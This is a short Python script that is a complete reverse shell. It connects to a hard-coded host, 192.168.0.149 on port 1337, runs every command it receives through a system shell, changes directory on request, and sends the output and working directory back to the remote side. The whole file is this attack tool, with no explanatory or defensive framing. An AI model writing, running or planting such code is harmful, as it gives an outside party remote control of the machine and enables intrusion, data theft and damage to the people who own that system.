import subprocess
import socket
import os

def processData(s):
	while True:
		data = s.recv(1024)
		strData = data.decode("utf-8").replace('\n', '')

		if strData == 'exit':
			break

		if strData[:2] == "cd":
			try:
				os.chdir(strData[3:])
			except OSError as e:
				print(e)

		if len(data) > 0:
			try:	
				proc = subprocess.Popen(strData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stream = proc.stdout.read() + proc.stderr.read()
				stream_str = str(stream, "utf-8")
				s.send(str.encode(stream_str + str(os.getcwd()) + '> '))
			except socket.error as e:
				print(e)
				
	s.close()	
	exit(1)

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.0.149", 1337))
	processData(s)

except socket.error as msg:
	print(msg)
